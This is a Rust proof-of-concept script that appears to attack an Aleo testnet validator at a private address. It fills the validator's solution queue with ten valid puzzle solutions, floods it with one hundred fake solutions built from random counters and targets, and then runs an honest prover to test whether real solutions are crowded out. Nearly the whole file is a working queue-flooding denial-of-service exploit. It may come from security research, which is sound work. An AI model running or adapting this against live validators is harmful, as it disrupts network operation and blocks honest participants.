mod client;

use std::str::FromStr;
use std::time::Duration;
use rand::{random, Rng};
use rand::rngs::ThreadRng;
use snarkvm::ledger::puzzle::{Puzzle, Solution};
use crate::client::{AleoRpcClient, get_network_state};
use snarkvm::prelude::{Address, Network, TestnetV0 as CurrentNetwork};
use snarkvm::circuit::AleoTestnetV0 as CurrentAleo;
use snarkvm_ledger_puzzle_epoch::synthesis::SynthesisPuzzle;
pub type CurrentPuzzle = SynthesisPuzzle<CurrentNetwork, CurrentAleo>;

#[tokio::main]
async fn main() {
    let client = AleoRpcClient::new("http://192.168.200.25:3030/testnet/");
    let puzzle = Puzzle::new::<CurrentPuzzle>();
    let rng = &mut rand::thread_rng();

    // 1. Send validator 10 valid solutions to fill the queue
    let mut valid_solution = vec![];
    let network_state = get_network_state(&client).await.unwrap();
    while valid_solution.len() < 10 {
        if let Ok(solution) = puzzle.prove(network_state.epoch_hash, Address::zero(), rng.gen(), Some(network_state.proof_target)) {
            valid_solution.push(solution);
        };
    }
    println!("Filling the solution queue with 10 valid solutions...");
    for solution in valid_solution {
        if let Err(err) = client.broadcast_solution(solution).await {
            println!("Broadcast: {}", err);
        }
    }

    // 2. Fill the solution queue with fake solutions
    println!("Filling the solution queue with fake solutions...");
    for _ in 0..100 {
        let solution = sample_fake_solution(rng, network_state.epoch_hash);
        let client = client.clone();
        tokio::spawn(async move {
            if let Err(err) = client.broadcast_solution(solution).await {
                println!("Broadcast: {}", err);
            }
        });
    }
    println!("Filling the solution queue with fake solutions done.");

    // 3. Honest prover prove the puzzle
    loop {
        let network_state = get_network_state(&client).await.unwrap();
        if let Ok(solution) = puzzle.prove(network_state.epoch_hash, Address::zero(), rng.gen(), Some(network_state.proof_target)) {
            if let Err(err) = client.broadcast_solution(solution).await {
                println!("Broadcast: {}", err);
            }
            tokio::time::sleep(Duration::from_secs(5)).await;
        };
    }
}

fn sample_fake_solution(rng: &mut ThreadRng, epoch_hash: <CurrentNetwork as Network>::BlockHash) -> Solution<CurrentNetwork> {
    let counter = rng.gen();
    let target = rng.gen();
    let partial_solution = snarkvm::ledger::puzzle::PartialSolution::new(
        epoch_hash,
        Address::zero(),
        counter,
    ).unwrap();
    Solution::new(partial_solution, target)
}